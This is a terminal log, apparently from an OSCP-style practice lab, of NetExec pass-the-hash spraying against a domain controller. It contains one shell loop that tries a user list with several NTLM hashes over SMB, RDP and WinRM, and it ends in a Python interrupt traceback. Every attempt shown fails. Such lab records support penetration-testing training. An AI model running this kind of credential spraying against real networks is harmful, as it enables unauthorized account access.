+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jane.Booth:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Frank.Farrell:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Shane.Mitchell:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Jamie.Thomas:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Linda.Patel:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+^C[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m DC01\Emily.Bishop:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+^C^CException ignored on threading shutdown:
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1537, in _shutdown
+    atexit_call()
+  File "/usr/lib/python3.13/threading.py", line 1508, in <lambda>
+    _threading_atexits.append(lambda: func(*arg, **kwargs))
+  File "/usr/lib/python3.13/concurrent/futures/thread.py", line 31, in _python_exit
+    t.join()
+  File "/usr/lib/python3.13/threading.py", line 1095, in join
+    self._handle.join(timeout)
+KeyboardInterrupt:
+^[[A^CTraceback (most recent call last):
+  File [35m"/usr/bin/nxc"[39m, line [35m8[39m, in [35m<module>[39m
+    sys.exit([31mmain[1m()[0m)
+             [31m~~~~[1m^^[0m
+  File [35m"/usr/lib/python3/dist-packages/nxc/netexec.py"[39m, line [35m148[39m, in [35mmain[39m
+    protocol_object = getattr([31mp_loader.load_protocol[1m(protocol_path)[0m, args.protocol)
+                              [31m~~~~~~~~~~~~~~~~~~~~~~[1m^^^^^^^^^^^^^^^[0m
+  File [35m"/usr/lib/python3/dist-packages/nxc/loaders/protocolloader.py"[39m, line [35m14[39m, in [35mload_protocol[39m
+    [31mloader.exec_module[1m(protocol)[0m
+    [31m~~~~~~~~~~~~~~~~~~[1m^^^^^^^^^^[0m
+  File [35m"<frozen importlib._bootstrap_external>"[39m, line [35m1023[39m, in [35mexec_module[39m
+  File [35m"<frozen importlib._bootstrap>"[39m, line [35m488[39m, in [35m_call_with_frames_removed[39m
+  File [35m"/usr/lib/python3/dist-packages/nxc/protocols/rdp.py"[39m, line [35m9[39m, in [35m<module>[39m
+    from nxc.connection import connection
+  File [35m"/usr/lib/python3/dist-packages/nxc/connection.py"[39m, line [35m12[39m, in [35m<module>[39m
+    from dns import resolver, rdatatype
+  File [35m"/usr/lib/python3/dist-packages/dns/resolver.py"[39m, line [35m30[39m, in [35m<module>[39m
+    import dns._ddr
+  File [35m"/usr/lib/python3/dist-packages/dns/_ddr.py"[39m, line [35m12[39m, in [35m<module>[39m
+    import dns.nameserver
+  File [35m"/usr/lib/python3/dist-packages/dns/nameserver.py"[39m, line [35m5[39m, in [35m<module>[39m
+    import dns.asyncquery
+  File [35m"/usr/lib/python3/dist-packages/dns/asyncquery.py"[39m, line [35m40[39m, in [35m<module>[39m
+    from dns.query import (
+    ...<12 lines>...
+    )
+  File [35m"/usr/lib/python3/dist-packages/dns/query.py"[39m, line [35m66[39m, in [35m<module>[39m
+    import httpcore._backends.sync
+  File [35m"/usr/lib/python3/dist-packages/httpcore/__init__.py"[39m, line [35m1[39m, in [35m<module>[39m
+    from ._api import request, stream
+  File [35m"/usr/lib/python3/dist-packages/httpcore/_api.py"[39m, line [35m7[39m, in [35m<module>[39m
+    from ._sync.connection_pool import ConnectionPool
+  File [35m"/usr/lib/python3/dist-packages/httpcore/_sync/__init__.py"[39m, line [35m20[39m, in [35m<module>[39m
+    from .socks_proxy import SOCKSProxy
+[1m[35mKeyboardInterrupt[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m for i in smb rdp winrm; do nxc $i 10.10.197.146 -u users.txt -H hashes.txt;done
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) ([1m[32msigning:True[0m) ([1m[36mSMBv1:None[0m)[1m[33m (Null Auth:True)[0m
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\eric.wallows:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\web_svc:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\john.dorian:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\sql_svc:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Joan.North:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom_admin:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom.kinney:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\celia.almeda:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\krbtgt:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Guest:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Administrator:3c4495bbd678fac8c9d218be4f2bbc7b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\eric.wallows:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\web_svc:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\john.dorian:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\sql_svc:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Joan.North:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom_admin:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom.kinney:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\celia.almeda:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\krbtgt:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Guest:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Administrator:830ffdda4c0acd7488ec363ef1f5a175 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\eric.wallows:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\web_svc:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\john.dorian:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\sql_svc:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Joan.North:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom_admin:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom.kinney:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\celia.almeda:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\krbtgt:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Guest:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Administrator:cc347a164e1bf1a36e2c0552dae0003e STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\eric.wallows:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\web_svc:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\john.dorian:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\sql_svc:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Joan.North:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom_admin:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom.kinney:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\celia.almeda:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\krbtgt:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Guest:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Administrator:00ac08f4d5d113c673496c3b64d0f44b STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\eric.wallows:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\web_svc:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\john.dorian:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\sql_svc:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Janice.Turner:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Thomas.Robinson:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Aimee.Hunt:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Georgina.Begum:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Oliver.Gray:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Kenneth.Coles:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Carol.Webb:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Joan.North:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jane.Booth:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Frank.Farrell:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Shane.Mitchell:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Jamie.Thomas:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Linda.Patel:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
